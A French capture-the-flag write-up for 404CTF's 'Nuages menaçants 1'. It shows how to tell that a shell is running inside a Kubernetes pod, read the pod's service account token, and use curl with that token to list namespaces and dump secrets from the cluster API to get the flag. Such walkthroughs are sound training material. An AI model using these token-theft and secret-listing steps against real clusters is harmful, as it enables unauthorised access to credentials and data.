# Nuages menaçants 1

## Challenge

```
 Les nuages menaçants 1/3

Vous prenez une pause bien méritée et vous vous asseyez à une table. Vous regardez les nuages quand un homme s'approche de vous :
« Vous aussi les nuages vous passionnent ? Je vous proposerai bien une madeleine, mais c'est ma dernière... Mais j'oublie l'essentiel : je suis Marcel Proust. »
Il prend quelques minutes pour contempler les nuages, puis il reprend :
« Les nuages m'ont toujours passionné... J'ai entendu parler d'un nouveau type de nuage récemment, pouvez-vous me donner ses secrets ? »

 
Connectez-vous au nuage avec le mot de passe suivant : 4GqWrNkNuN
Le challenge peut prendre quelques minutes à se lancer.
ssh 404ctf@challenges.404ctf.fr -p 30905
```

## Solution

Si on affiche l'environnement :

```sh
$ env
# ...
KUBERNETES_SERVICE_PORT_HTTPS=443                                                                        
KUBERNETES_SERVICE_PORT=443
HOSTNAME=start
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
PWD=/
NAMESPACE=default
HOME=/root
KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
KUBERNETES_SERVICE_HOST=10.43.0.1
KUBERNETES_PORT=tcp://10.43.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
APISERVER=10.43.0.1:443
# ...
```

On se trouve en fait dans un pod !

https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/abusing-roles-clusterroles-in-kubernetes

https://kubernetes.io/docs/tasks/run-application/access-api-from-pod/

curl est disponible.

On peut récupérer le token admin de l'API Kube, puis requêter l'API:

```sh
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# kube api info (cidr and services ips)
kurl -v https://$APISERVER/api
# lister ses permissions depuis le pod
kurl -i -s -k -X $'POST' \
    -H $'Content-Type: application/json' \
    --data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
    "https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
#> permissions ...
```

Lister les namespaces :

```sh
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/namespaces/
```

il y a un namespace 404ctf.
Lister ses secrets :

```sh
# list secrets
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/namespaces/404ctf/secrets
```

Le flag est dans le secret "flag" ;)